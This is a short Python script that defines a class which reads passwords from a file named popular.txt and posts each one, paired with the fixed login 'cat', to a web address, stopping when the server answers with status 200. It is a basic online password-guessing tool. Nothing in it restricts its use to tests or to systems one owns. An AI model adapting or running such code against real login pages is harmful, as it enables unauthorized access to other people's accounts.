import requests


class PopularPasswordsGenerator:

    def __init__(self, use_url='https://www.google.com/', use_file=open('popular.txt').read()):
        self.use_url = use_url
        self.use_file = use_file

    def generate_popular_password(self):

        passwords = self.use_file.split('\n')

        for password in passwords:
            response = requests.post(self.use_url,
                                     json={'login': 'cat', 'password': password})
            print(password)
            if response.status_code == 200:
                print('SUCCESS', password)
                return 'SUCCESS'
